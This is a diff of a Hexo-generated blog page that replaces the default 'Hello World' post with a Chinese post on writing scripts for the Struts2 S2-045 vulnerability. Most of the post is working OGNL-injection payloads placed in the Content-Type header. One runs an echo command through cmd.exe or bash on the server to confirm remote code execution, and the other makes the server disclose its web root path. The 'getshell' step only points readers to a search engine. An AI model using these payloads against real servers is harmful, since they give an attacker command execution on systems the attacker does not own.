@@ -71,10 +71,12 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="网络安全,python," />
 
 
 
+
+  
 
 
   <link rel="alternate" href="/atom.xml" title="masker" type="application/atom+xml" />
@@ -89,19 +91,19 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick">
+<meta name="description" content="##始末    struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。        当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具postman。
+###我的D">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://phpplay.github.io/2017/03/14/hello-world/index.html">
+<meta property="og:title" content="关于struts2-045漏洞的脚本编写">
+<meta property="og:url" content="http://phpplay.github.io/2017/03/14/whoami/index.html">
 <meta property="og:site_name" content="masker">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick">
-<meta property="og:updated_time" content="2017-03-14T01:41:48.019Z">
+<meta property="og:description" content="##始末    struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。        当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具postman。
+###我的D">
+<meta property="og:updated_time" content="2017-03-14T04:47:07.322Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick">
+<meta name="twitter:title" content="关于struts2-045漏洞的脚本编写">
+<meta name="twitter:description" content="##始末    struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。        当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具postman。
+###我的D">
 
 
 
@@ -129,13 +131,13 @@ Quick">
 
 
 
-  <link rel="canonical" href="http://phpplay.github.io/2017/03/14/hello-world/"/>
+  <link rel="canonical" href="http://phpplay.github.io/2017/03/14/whoami/"/>
 
 
 
 
 
-  <title> Hello World | masker </title>
+  <title> 关于struts2-045漏洞的脚本编写 | masker </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -254,7 +256,7 @@ Quick">
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://phpplay.github.io/2017/03/14/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://phpplay.github.io/2017/03/14/whoami/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="masker">
@@ -275,7 +277,7 @@ Quick">
             
             
               
-                Hello World
+                关于struts2-045漏洞的脚本编写
               
             
           </h1>
@@ -290,7 +292,7 @@ Quick">
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-14T09:41:48+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-14T11:58:35+08:00">
                 2017-03-14
               </time>
             
@@ -326,15 +328,10 @@ Quick">
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <p>##始末<br>    struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。<br>        当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具<a href="https://www.getpostman.com/" target="_blank" rel="external">postman</a>。</p>
+<p>###我的DEMO<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url=<span class="string">"http://text.com/index.action"</span></div><div class="line">req = urllib2.Request(url)</div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 11987654321').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div><div class="line">res = urllib2.urlopen(req)</div><div class="line">html = res.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"><span class="keyword">if</span> <span class="string">"11987654321"</span> <span class="keyword">in</span> html:</div><div class="line">    <span class="keyword">print</span> url + <span class="string">"      is OK"</span></div></pre></td></tr></table></figure></p>
+<p>###获取路径<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#cmd='echo '+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div></pre></td></tr></table></figure></p>
+<p>###getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">自己百度吧</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -362,6 +359,14 @@ Quick">
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/网络安全/" rel="tag"># 网络安全</a>
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
 
       
         
@@ -371,15 +376,15 @@ Quick">
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2017/03/14/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/03/14/whoami/" rel="prev" title="关于struts2-045漏洞的脚本编写">
-                关于struts2-045漏洞的脚本编写 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -426,17 +431,8 @@ Quick">
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview sidebar-panel">
+      <section class="site-overview sidebar-panel sidebar-panel-active">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -496,22 +492,6 @@ Quick">
 
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
